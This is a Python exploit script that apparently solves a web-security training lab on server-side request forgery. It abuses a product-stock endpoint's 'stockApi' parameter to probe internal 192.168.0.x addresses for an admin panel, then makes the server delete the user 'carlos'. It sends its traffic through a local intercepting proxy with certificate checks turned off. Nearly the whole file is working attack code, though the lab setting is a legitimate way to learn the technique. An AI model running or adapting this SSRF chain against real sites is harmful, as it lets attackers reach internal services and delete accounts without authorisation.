import requests
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_admin_panel(url:str):
    for i in range(255, 1, -1):
        body = {'stockApi': f'http://192.168.0.{i}:8080/admin'}
        r = requests.post(url + '/product/stock', proxies=proxies, verify=False, data=body)
        if r.status_code == 200:
            admin_url = f'http://192.168.0.{i}:8080/admin'
            break
    if admin_url:
        return admin_url
    else:
        return None

def delete_carlos(url:str, admin_url:str):
    delete_endpoint = '/delete?username=carlos'
    body = {'stockApi': admin_url + delete_endpoint}
    
    r = requests.post(url + '/product/stock', data=body, proxies=proxies, verify=False, allow_redirects=False)
    if r.status_code == 302:
        print("Carlos Deleted Successfully")
        return True
    else:
        print("Failed to delete carlos")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')

    admin_url = get_admin_panel(url)
    if not admin_url:
        print("Failed to find admin panel")
        sys.exit(-1)
    
    if delete_carlos(url, admin_url):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()